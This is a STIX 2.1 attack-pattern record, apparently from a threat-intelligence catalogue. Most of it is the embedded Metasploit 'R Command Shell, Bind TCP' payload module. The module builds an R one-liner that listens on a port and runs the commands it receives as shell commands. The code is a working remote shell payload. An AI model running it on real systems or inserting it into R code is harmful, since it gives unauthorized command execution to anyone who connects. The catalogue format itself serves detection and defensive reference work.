{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--05736aae-6cd3-4710-bec1-da7a5be01655",
    "created": "2024-08-14T16:33:19.286027Z",
    "modified": "2024-08-14T16:33:19.286031Z",
    "name": "R Command Shell, Bind TCP",
    "description": "Continually listen for a connection and spawn a command shell via R",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/r/shell_bind_tcp.rb",
            "external_id": "shell_bind_tcp.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nmodule MetasploitModule\n\n  CachedSize = 125\n\n  include Msf::Payload::Single\n  include Msf::Payload::R\n  include Msf::Sessions::CommandShellOptions\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'        => 'R Command Shell, Bind TCP',\n      'Description' => 'Continually listen for a connection and spawn a command shell via R',\n      'Author'      => [ 'RageLtMan <rageltman[at]sempervictus>' ],\n      'License'     => MSF_LICENSE,\n      'Platform'    => 'r',\n      'Arch'        => ARCH_R,\n      'Handler'     => Msf::Handler::BindTcp,\n      'Session'     => Msf::Sessions::CommandShell,\n      'PayloadType' => 'r',\n      'Payload'     => { 'Offsets' => {}, 'Payload' => '' }\n    ))\n  end\n\n  def generate(_opts = {})\n    return prepends(r_string)\n  end\n\n  def r_string\n    return \"s<-socketConnection(port=#{datastore['LPORT']},\" +\n    \"blocking=TRUE,server=TRUE,open='r+');while(TRUE){writeLines(readLines\" +\n    \"(pipe(readLines(s,1))),s)}\"\n  end\nend\n",
    "x_mitre_platforms": [
        "r'"
    ]
}